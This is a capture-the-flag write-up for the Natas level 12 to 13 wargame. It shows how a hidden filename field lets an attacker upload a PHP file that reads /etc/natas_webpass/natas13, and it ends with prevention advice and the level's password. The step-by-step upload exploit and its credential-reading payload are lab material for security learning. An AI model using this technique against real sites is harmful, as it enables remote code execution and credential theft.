# Natas Level 12 → 13

## Objective

Retrieve the password for the next level by exploiting an insecure file upload implementation that trusts a client-controlled filename.

---

## Enumeration

* Reviewed the webpage source code.
* Identified that users could upload a JPEG image (maximum size: 1 KB).
* Analyzed how uploaded files were stored.
* Observed that the uploaded file extension was determined using a hidden form field rather than the uploaded file itself.

---

## Source Code Analysis

The upload form contains the following hidden input:

```html
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```

When the form is submitted, the server generates the upload path using:

```php
$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
```

The function responsible for determining the upload path is:

```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```

The uploaded file is finally stored using:

```php
move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);
```

The only validation performed is:

```php
if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "File is too big";
}
```

No validation is performed on:

* File extension
* MIME type
* File contents
* Image format

---

## Observation

The application assumes the hidden `filename` field is trustworthy.

Since hidden form fields are sent by the client, they can be modified before reaching the server.

Instead of using the original filename of the uploaded file, the server extracts the extension from:

```text
$_POST["filename"]
```

This allows an attacker to control the extension of the uploaded file.

---

## Vulnerability

### Untrusted Client-Controlled Filename

The application trusts a hidden form field to determine the extension of the uploaded file.

Because the extension is completely controlled by the client, an attacker can upload executable PHP code while changing the hidden filename from:

```text
random.jpg
```

to

```text
shell.php
```

The server stores the uploaded file with a `.php` extension, allowing it to execute on the server.

This results in **Remote Code Execution (RCE).**

---

# Request Analysis

## Original Request

The browser submits:

```http
Content-Disposition: form-data; name="filename"

foy2wk02mw.jpg
```

Although the uploaded file is named:

```http
filename="file.php"
```

the server ignores this filename and only uses the hidden field.

---

## Modified Request (Burp Suite)

Intercept the request using Burp Suite and change:

```http
Content-Disposition: form-data; name="filename"

foy2wk02mw.jpg
```

↓

```http
Content-Disposition: form-data; name="filename"

file.php
```

Nothing else needs to be modified.

---

## Exploitation

### Step 1 - Create a PHP Payload

Create a small PHP file (less than 1 KB).

**shell.php**

```php
<?php
echo file_get_contents('/etc/natas_webpass/natas13');
?>
```

---

### Step 2 - Select the File

Choose the PHP file in the upload form.

**Input**

```text
file.php
```

---

### Step 3 - Intercept the Request

Using Burp Suite:

```
Proxy
    ↓
Intercept
    ↓
Capture Upload Request
```

---

### Step 4 - Modify the Hidden Filename

**Original**

```text
filename = foy2wk02mw.jpg
```

↓

**Modified**

```text
filename = file.php
```

---

### Step 5 - Forward the Request

Forward the modified request to the server.

The server now executes:

```php
$target_path = makeRandomPathFromFilename("upload", "file.php");
```

↓

The extension becomes:

```text
php
```

↓

The uploaded file is stored as:

```text
upload/7gnhg7wka9.php
```

instead of

```text
upload/7gnhg7wka9.jpg
```

---

### Step 6 - Execute the Uploaded File

Open:

```text
upload/7gnhg7wka9.php
```

The PHP payload executes:

```php
<?php
echo file_get_contents('/etc/natas_webpass/natas13');
?>
```

↓

The contents of:

```text
/etc/natas_webpass/natas13
```

are displayed.

---

## Attack Flow

```
Create PHP Payload
        │
        ▼
Choose File
        │
        ▼
Intercept Upload Request
        │
        ▼
Modify Hidden Filename
(.jpg → .php)
        │
        ▼
Forward Request
        │
        ▼
Server Saves File
as .php
        │
        ▼
Open Uploaded File
        │
        ▼
PHP Executes
        │
        ▼
Read Password File
        │
        ▼
Reveal Password
```

---

## Result

The server accepted the modified filename and stored the uploaded file as an executable PHP script.

Visiting the uploaded file executed the PHP payload and revealed the password for **Natas Level 13**.

---

## Prevention

* Never trust hidden form fields.
* Determine the file extension from the uploaded file, not client input.
* Validate MIME type and file contents.
* Store uploaded files outside the web root.
* Rename uploaded files without preserving executable extensions.
* Disable execution permissions inside upload directories.

---

## Key Takeaways

* Hidden form fields should never be trusted.
* Client-side controls can always be modified.
* File upload validation must verify the actual file, not user-supplied metadata.
* Executable uploads can easily lead to Remote Code Execution (RCE).
* Upload directories should never allow execution of uploaded files.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas13
Password : g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
```

</details>